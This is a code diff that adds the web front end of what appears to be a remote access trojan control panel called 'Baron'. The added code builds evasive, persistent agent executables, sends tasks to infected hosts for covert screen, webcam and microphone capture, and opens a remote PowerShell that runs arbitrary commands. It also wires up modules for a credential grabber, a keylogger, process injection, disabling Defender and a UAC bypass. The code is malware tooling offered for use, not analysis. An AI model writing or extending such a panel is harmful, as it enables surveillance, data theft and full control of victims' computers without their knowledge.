-            localStorage.setItem('baron-v2-stats', JSON.stringify([...cont.querySelectorAll('.stat-val')].map(e=>e.id)));
-            },0);
-        });
-        s.addEventListener('dragover', e=>e.preventDefault());
-        s.addEventListener('dragenter', function(e){ e.preventDefault(); this.style.transform='scale(1.05)'; });
-        s.addEventListener('dragleave', function(){ this.style.transform=''; });
-        s.addEventListener('drop', function(){
-            this.style.transform='';
-            if(dragged && this !== dragged){
-                let all=[...cont.querySelectorAll('.stat-card')], dI=all.indexOf(dragged), cI=all.indexOf(this);
-                if(dI<cI) this.parentNode.insertBefore(dragged, this.nextSibling);
-                else this.parentNode.insertBefore(dragged, this);
-            }
-        });
-    });
-});
+    html += `<div class="log-line"><span class="log-time">[${t}]</span><span class="${typeClass}">${m}</span></div>`;
+  });
+  cont.innerHTML = html;
+}
+
+async function buildAgent() {
+  const st = document.getElementById('b-status');
+  st.textContent = "Forging payload...";
+  const req = {
+    server: document.getElementById('b-sv').value,
+    process_name: document.getElementById('b-proc').value,
+    beacon: parseInt(document.getElementById('b-beacon').value),
+    anti_analysis: document.getElementById('b-aa').value === 'true',
+    persistence: document.getElementById('b-pers').value === 'true',
+    melt: document.getElementById('b-melt').value === 'true',
+    anti_kill: document.getElementById('b-kill').value === 'true',
+    debug: false
+  };
+  const res = await api('/api/panel/build', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(req) });
+  if (res && res.ok && res.compile_status==='success') {
+    st.textContent = "SUCCESS. Downloading...";
+    const fb = await fetch(res.download_url, {headers:{'X-Token':TOKEN}});
+    if(fb.ok) {
+      const a=document.createElement('a'); a.href=URL.createObjectURL(await fb.blob()); a.download=(res.name||'agent')+'.exe'; a.click();
+    }
+  } else {
+    st.textContent = "FAILED: " + (res?res.error:'Unknown Error');
+  }
+}
+
+// --- CONTEXT MENU & 15 MODS ---
+document.addEventListener('click', () => { document.getElementById('ctx-menu').style.display='none'; });
+
+function showCtx(e, c) {
+  e.preventDefault();
+  selectedAgent = c;
+  const ctx = document.getElementById('ctx-menu');
+  document.getElementById('ctx-agent-id').textContent = `Agent: ${c.hostname}`;
+  ctx.style.display = 'block';
+  ctx.style.left = e.clientX + 'px';
+  ctx.style.top = e.clientY + 'px';
+  
+  // Boundary check
+  if(e.clientX + ctx.offsetWidth > window.innerWidth) ctx.style.left = (window.innerWidth - ctx.offsetWidth) + 'px';
+  if(e.clientY + ctx.offsetHeight > window.innerHeight) ctx.style.top = (window.innerHeight - ctx.offsetHeight) + 'px';
+}
+
+function tSend(action, params={}) {
+  if(!selectedAgent) return;
+  api('/api/panel/task', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({id: selectedAgent.id, action: action, ...params})
+  });
+}
+
+function ctxAction(mod) {
+  if(!selectedAgent) return;
+  const id = selectedAgent.id;
+
+  switch(mod) {
+    case 'screen':
+      createWindow({
+        title: `Screen Feed [${id.substr(0,6)}]`, width:800, height:600,
+        html: `
+          <div class="stream-wrapper">
+            <img class="stream-obj" id="stream-img-${id}" src="" alt="Awaiting Stream...">
+            <div class="stream-ctrl">
+              <button class="gold-btn" onclick="tSend('screen_start', {qual:50})">Start Stream</button>
+              <button onclick="tSend('screen_stop')">Stop</button>
+            </div>
+          </div>
+        `
+      });
+      break;
+
+    case 'webcam':
+      createWindow({
+        title: `Webcam Feed [${id.substr(0,6)}]`, width:640, height:480,
+        html: `
+          <div class="stream-wrapper">
+            <img class="stream-obj" id="stream-img-${id}" src="" alt="Awaiting Webcam Feed...">
+            <div class="stream-ctrl">
+              <button class="gold-btn" onclick="tSend('webcam_start')">Start Camera</button>
+              <button onclick="tSend('webcam_stop')">Stop</button>
+            </div>
+          </div>
+        `
+      });
+      break;
+
+    case 'mic':
+      tSend('audio_start', {dur:10});
+      createWindow({
+        title: `Audio Dump [${id.substr(0,6)}]`, width:400, height:200,
+        html: `<div style="text-align:center; padding:20px; color:var(--highlight);"><p>Microphone task scheduled.</p><p>Check Telemetry logs for download link when complete.</p></div>`
+      });
+      break;
+
+    case 'shell':
+      const winId = 'term_' + id;
+      createWindow({
+        id: winId, title: `Secure Shell [${id.substr(0,6)}]`, width:700, height:500,
+        html: `
+          <div class="term-container">
+            <div class="term-output" id="out-${winId}">[BARON SECURE SHELL] Connection established.\nType a command and press Enter.\n</div>
+            <div class="term-input">
+              <span>PS ></span>
+              <input type="text" id="inp-${winId}" autocomplete="off" onkeydown="cmdHandle(event, '${id}', '${winId}')">
+            </div>
+          </div>
+        `,
+        onInit: () => setTimeout(()=>document.getElementById(`inp-${winId}`).focus(), 100)
+      });
+      break;
+
+    case 'grabber':
+    case 'files':
+    case 'clipboard':
+    case 'regedit':
+    case 'processes':
+    case 'netstat':
+    case 'power':
+    case 'inject':
+    case 'defender':
+    case 'uac':
+    case 'keylogger':
+      // Currently stubbing out advanced modules requiring C# rewrites
+      createWindow({
+        title: `${mod.toUpperCase()} Module [${id.substr(0,6)}]`, width:400, height:250,
+        html: `
+          <div style="text-align:center; padding:30px;">
+            <h2 style="color:var(--highlight); font-family:var(--font-serif); margin-bottom:15px;">Module Payload</h2>
+            <p style="color:var(--text-dim); margin-bottom: 20px;">Deploying <b>${mod}</b> to agent memory.</p>
+            <button class="gold-btn" onclick="tSend('${mod}')">EXECUTE TASK</button>
+          </div>
+        `
+      });
+      break;
+  }
+}
+
+// Shell logic
+function cmdHandle(e, agentId, winId) {
+  if(e.key==='Enter') {
+    const v = e.target.value; e.target.value = '';
+    const out = document.getElementById(`out-${winId}`);
+    out.textContent += `PS > ${v}\n`;
+    out.scrollTop = out.scrollHeight;
+    api('/api/panel/task', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:agentId, action:'exec', cmd:v}) });
+  }
+}
 </script>
 </body>
 </html>
